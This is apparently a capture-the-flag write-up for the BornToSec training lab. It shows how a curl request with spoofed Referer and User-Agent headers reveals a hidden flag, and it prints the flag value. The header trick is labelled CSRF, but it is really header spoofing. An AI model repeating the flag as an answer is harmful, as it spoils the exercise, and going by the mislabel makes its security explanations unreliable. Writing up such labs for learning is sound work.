# CSRF

### Breach Exploit
In the bottom of the home page we can see a link '© BornToSec', click here.
```
http://x.x.x.x/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

After this in the source code of the page, we can see some comments:

```html
<!-- You must come from : "https://www.nsa.gov/". -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
```

With this informations we understand we need to change the referer and the user agent with the informations in the comments.

```
curl -H "Referer: https://www.nsa.gov/" \
-H "User-Agent: ft_bornToSec" \
http://x.x.x.x/\?page\=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f \
2> /dev/null | grep -i Flag
```

This request result to this

```html
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```
### Fix Breach
Check and validate the Referrer Header
```https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html```

### Documentation
```https://owasp.org/www-community/attacks/csrf```